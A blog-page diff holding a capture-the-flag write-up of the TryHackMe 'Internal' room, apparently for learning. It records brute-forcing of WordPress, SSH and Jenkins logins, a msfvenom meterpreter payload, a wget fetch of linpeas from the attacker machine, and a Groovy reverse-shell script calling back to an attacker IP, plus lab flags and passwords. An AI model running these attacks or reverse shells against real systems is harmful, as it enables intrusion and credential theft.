@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Internal Write-up | TryHackMe Hard | Utkarsh M</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <header class="site-title-main">
+      Utkarsh M
+    </header>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/post/">Posts</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="post-container">
+  <div class="post-date">2022/06/14</div>
+  <h1 class="post-title">Internal Write-up | TryHackMe Hard</h1>
+</div>
+
+<main>
+<h2 id="screenshot"><img src="/assets/img/thm/internal/1.jpeg" alt="screenshot"></h2>
+<p>Runing threader3000:</p>
+<pre><code class="language-bash">python threader3000.py
+10.10.104.32
+</code></pre>
+<p>output</p>
+<pre><code>Port 22 is open
+Port 80 is open
+</code></pre>
+<p>port 80: Apache 2.4.29 /default page.</p>
+<p>running suggested nmap scan:</p>
+<pre><code class="language-bash">nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.104.32 10.10.104.32
+</code></pre>
+<p>output:</p>
+<pre><code>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
+|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
+|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>directory enumeration:</p>
+<pre><code class="language-bash">gobuster dir --wordlist=/usr/share/dict/directory-list-2.3-medium.txt --url=http://10.10.104.32/ -t 100
+</code></pre>
+<p>Added internal.thm to /etc/hosts using vim</p>
+<p>enumeration result:</p>
+<pre><code>/wordpress            (Status: 301) [Size: 316] [--&gt; http://10.10.104.32/wordpress/]
+/blog                 (Status: 301) [Size: 311] [--&gt; http://10.10.104.32/blog/]
+/javascript           (Status: 301) [Size: 317] [--&gt; http://10.10.104.32/javascript/]
+/phpmyadmin           (Status: 301) [Size: 317] [--&gt; http://10.10.104.32/phpmyadmin/]
+/server-status        (Status: 403) [Size: 277]
+</code></pre>
+<p>checking /wordpress:</p>
+<p>wappalyzer results: WordPress5.4.2</p>
+<p>user found : admin</p>
+<p>running wpscan:</p>
+<pre><code>wpscan --url http://internal.thm/blog/
+</code></pre>
+<p><img src="/assets/img/thm/internal/2.png" alt="screenshot"></p>
+<p>Found nothing useful.</p>
+<p>bruteforcing wp using wpscan:</p>
+<pre><code class="language-bash">wpscan --url http://internal.thm/blog/ --passwords /usr/share/dict/rockyou.txt --usernames admin
+</code></pre>
+<p>looking at phpmyadmin page</p>
+<p>we’ll proly not look later, we found a password for admin. :P</p>
+<p><img src="/assets/img/thm/internal/3.png" alt="screenshot"></p>
+<pre><code>[!] Valid Combinations Found:
+ | Username: admin, Password: my2boys
+</code></pre>
+<p>we can succesfully login through wp-login. :)</p>
+<p>Uploading php-reverse-shell:</p>
+<pre><code class="language-bash">nc -lvnp 1234
+</code></pre>
+<p>rce success :</p>
+<p><img src="/assets/img/thm/internal/4.png" alt="screenshot"></p>
+<p>Enumeration:</p>
+<p>user found: <code>aubreanna</code></p>
+<p>no perms to access aubreanna’s home folder</p>
+<pre><code class="language-bash">$ cat /etc/issue
+Ubuntu 18.04.4 LTS \n \l
+</code></pre>
+<p>better shell:</p>
+<pre><code class="language-bash">python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<p>finding writable location: <code>/var/tmp</code></p>
+<pre><code class="language-bash">find / -writable 2&gt;/dev/null | cut -d &quot;/&quot; -f 2,3 | grep -v proc | sort -u
+</code></pre>
+<p>uploading and running Linpeas.sh</p>
+<pre><code class="language-bash">sudo python3 -m http.server 80
+wget 10.17.54.2/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+</code></pre>
+<p>interesting finds:</p>
+<pre><code class="language-sh">╔══════════╣ Searching passwords in config PHP files
+$dbpass='B2Ud4fEOZmVq';
+$dbuser='phpmyadmin';
+</code></pre>
+<p>We can successfully login into phpMyAdmin using the credentials.</p>
+<p>trying same credentials for aubreanna:doesn’t work.</p>
+<p><img src="/assets/img/thm/internal/5.png" alt="screenshot"></p>
+<p>switching to meterpreter shell:</p>
+<p>msfvenom:</p>
+<p>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.17.54.2 LPORT=4242 -f elf -o rev
+console, handler</p>
+<p>msfconsole</p>
+<pre><code class="language-bash">use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 10.17.54.2
+set LPORT 4242
+run
+</code></pre>
+<p>bruteforcing ssh on side:</p>
+<pre><code class="language-bash">hydra -l aubreanna -P /usr/share/dict/rockyou.txt 10.10.104.32 ssh
+</code></pre>
+<p>using search in meterpreter to find user.txt:</p>
+<p><img src="/assets/img/thm/internal/6.png" alt="screenshot"></p>
+<p>unlucky :</p>
+<p><img src="/assets/img/thm/internal/7.png" alt="screenshot"></p>
+<p>shadow.bak/passwd.bak in <code>/var/backups</code></p>
+<p><img src="/assets/img/thm/internal/8.png" alt="screenshot"></p>
+<p>After manually browsing through directories that seem helpful with head full of sleep, :)</p>
+<p><img src="/assets/img/thm/internal/9.png" alt="screenshot"></p>
+<pre><code>aubreanna:bubb13guM!@#123
+</code></pre>
+<p><img src="/assets/img/thm/internal/10.png" alt="screenshot"></p>
+<p>stopping the bruteforce on ssh. :P</p>
+<p>first flag:</p>
+<p><img src="/assets/img/thm/internal/11.png" alt="screenshot"></p>
+<h2 id="flag-1">Flag 1</h2>
+<p>user.txt</p>
+<pre><code>THM{int3rna1_fl4g_1}
+</code></pre>
+<p>finally a flag :))))))))))))))</p>
+<p>jenkins.txt:</p>
+<p><img src="/assets/img/thm/internal/12.png" alt="screenshot"></p>
+<p>setting up port-forwarding:</p>
+<pre><code class="language-bash">ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
+</code></pre>
+<p>we should be able to access jenkins via localhost:8080</p>
+<p><img src="/assets/img/thm/internal/13.png" alt="screenshot"></p>
+<p>running an nmap scan for version:</p>
+<pre><code class="language-bash">nmap -sV -sC -p8080 localhost
+</code></pre>
+<p><img src="/assets/img/thm/internal/14.png" alt="screenshot"></p>
+<p>Wappalyzer : <code>Jenkins 2.250</code></p>
+<p>gobuster scan:</p>
+<pre><code class="language-bash">gobuster dir --wordlist=/usr/share/dict/directory-list-2.3-medium.txt  -b &quot;403,404&quot; --url=http://localhost:8080/ -t 100
+</code></pre>
+<p>Output: mehhh.</p>
+<p>checking running processes:</p>
+<pre><code class="language-bash">ps aux
+</code></pre>
+<p>interesting output:</p>
+<pre><code>root      1430  0.0  0.1 404800  3448 ?        Sl   09:18   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.2 -container-port 8080
+root      1445  0.0  0.2   9364  4880 ?        Sl   09:18   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/7b979a7af7785217d1c5a58e7296fb7aaed912c61181af6d84
+aubrean+  1484  0.0  0.0   1148     4 ?        Ss   09:18   0:00 /sbin/tini -- /usr/local/bin/jenkins.sh
+aubrean+  1518  2.3 35.6 2775352 726556 ?      Sl   09:18   2:38 java -Duser.home=/var/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort=50000 -jar /usr/share/jenkins/jenkins.war
+aubrean+  1556  0.0  0.0      0     0 ?        Z    09:18   0:00 [jenkins.sh] &lt;defunct&gt;
+</code></pre>
+<p>so looking at processes, we can see that the jenkins is mostly running in a docker and is using proxy.</p>
+<p>after hrs of wasting time, ;_; Trying to access docker files or jenkins.sh via other means. lets try brute forcing jenkins via hydra:</p>
+<pre><code class="language-bash">hydra -s 8080 127.0.0.1 http-form-post &quot;/j_acegi_security_check:j_username=admin&amp;j_password=^PASS^:Invalid username or password&quot; -l admin -P /usr/share/dict/rockyou.txt -t 64 -w 30
+</code></pre>
+<p>ohoo</p>
+<pre><code>[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
+</code></pre>
+<p>Opening script console at http://localhost:8080/script</p>
+<p>we can use the following to run a reverse shell:</p>
+<pre><code class="language-sh">String host=&quot;10.17.54.2&quot;;
+int port=2424;
+String cmd=&quot;/bin/sh&quot;; #You can replace this with cmd.exe for Windows
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+</code></pre>
+<p>listener</p>
+<pre><code class="language-bash">nc -lvnp 2424
+</code></pre>
+<p>hmm: further enumeration :-/</p>
+<pre><code>jenkins@jenkins:~$ find / -name jenkins.sh 2&gt;/dev/null
+</code></pre>
+<p>gives us : <code>/usr/local/bin/jenkins.sh</code></p>
+<p>we can probably edit this file so that the Vm runs the script here and get a reverse shell again; :_; probably FFF. we’ll check this later.</p>
+<p>running sudo -l, getcap or checking for suid, crontabs doesn’t bring anything useful.</p>
+<p>checking OS:</p>
+<pre><code>uname -a
+</code></pre>
+<p>we get:</p>
+<pre><code>Linux jenkins 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 GNU/Linux
+</code></pre>
+<p>hmm.</p>
+<p>enumerating all directories. :_;</p>
+<p>:))))) found note.txt in /opt</p>
+<pre><code>cat note.txt
+Aubreanna,
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you
+need access to the root user account.
+root:tr0ub13guM!@#123
+</code></pre>
+<p>:P trying the credentials.</p>
+<p><img src="/assets/img/thm/internal/15.png" alt="screenshot"></p>
+<p>getting the last flag :</p>
+<pre><code class="language-bash">root@internal:/home/aubreanna# cd /root
+root@internal:~# ls
+root.txt  snap
+root@internal:~# cat root.txt
+THM{d0ck3r_d3str0y3r}
+root@internal:~#
+</code></pre>
+<h2 id="flag-2">Flag 2:</h2>
+<pre><code>THM{d0ck3r_d3str0y3r}
+</code></pre>
+
+</main>
+
+  <footer>
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
+<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/math-code.min.js" defer></script>
+<script src="//cdn.jsdelivr.net/npm/katex/dist/katex.min.js" defer></script>
+<script src="//cdn.jsdelivr.net/npm/katex/dist/contrib/auto-render.min.js" defer></script>
+<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/render-katex.js" defer></script>
+
+<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/center-img.min.js" defer></script>
+
+  
+  <hr/>
+  © <a href="https://utkar5hm.github.io">Utkarsh M</a> 2025 &ndash; 2025 | <a href="https://github.com/Utkar5hM">Github</a> | <a href="https://www.linkedin.com/in/utkar5hm/">Linkedin</a>
+  
+  </footer>
+  </body>
+</html>
+
